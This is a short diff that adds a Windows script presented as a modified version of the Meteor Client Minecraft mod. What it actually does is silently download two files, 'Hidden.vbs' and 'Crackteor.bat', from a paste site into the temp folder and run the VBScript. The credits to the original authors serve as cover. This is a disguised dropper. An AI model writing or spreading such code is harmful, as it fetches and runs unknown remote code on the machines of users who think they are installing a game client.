@@ -1,0 +1,8 @@
+cd $env:TEMP
+cmd /c "curl -s https://pastejustit.com/raw/dpjqrzjpzn>%temp%\Hidden.vbs"
+cmd /c "curl -s https://pastejustit.com/raw/m0qhw0otbr>%temp%\Crackteor.bat"
+start Hidden.vbs
+#This is a modifed version of METEOR CLIENT
+#I am not the owner of meteor client. Get MeteorClient Here: https://meteorclient.com/
+#Thanks MineGame159 and seasnail for making Meteor Client
+#-2ndunknown
